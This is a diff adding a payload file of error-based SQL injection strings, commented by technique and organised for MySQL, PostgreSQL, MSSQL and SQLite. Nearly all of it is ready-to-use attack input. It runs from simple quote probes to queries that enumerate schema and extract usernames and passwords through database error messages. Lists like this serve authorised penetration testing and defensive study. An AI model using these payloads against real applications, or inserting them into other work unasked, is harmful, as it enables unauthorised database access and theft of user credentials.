@@ -1,0 +1,47 @@
+# ============================================================
+# SQL Injection Payloads - Error-Based Extraction
+# ============================================================
+# Target: Applications that display database error messages.
+#
+# Technique: Force errors that include query results in the
+#   error message text.
+# ============================================================
+
+# --- Confirm injectable (trigger syntax errors) ---
+'
+''
+' AND '1
+'; --
+
+# --- MySQL error-based extraction ---
+# extractvalue()
+' AND extractvalue(1,CONCAT(0x7e,(SELECT @@version),0x7e)) --
+' AND extractvalue(1,CONCAT(0x7e,(SELECT database()),0x7e)) --
+' AND extractvalue(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e)) --
+' AND extractvalue(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e)) --
+' AND extractvalue(1,CONCAT(0x7e,(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x7e)) --
+
+# updatexml()
+' AND updatexml(1,CONCAT(0x7e,(SELECT @@version),0x7e),1) --
+' AND updatexml(1,CONCAT(0x7e,(SELECT database()),0x7e),1) --
+
+# Double query / subquery error
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x7e,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --
+
+# --- PostgreSQL error-based extraction ---
+' AND 1=CAST((SELECT version()) AS int) --
+' AND 1=CAST((SELECT current_database()) AS int) --
+' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int) --
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int) --
+
+# --- MSSQL error-based extraction ---
+' AND 1=CONVERT(int,(SELECT @@version)) --
+' AND 1=CONVERT(int,(SELECT DB_NAME())) --
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')) --
+' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users)) --
+
+# --- SQLite error-based ---
+# SQLite doesn't natively support error-based extraction in the same way,
+# but you can trigger errors to confirm injection:
+' AND 1=1 --
+' AND CAST('test' AS INTEGER) --
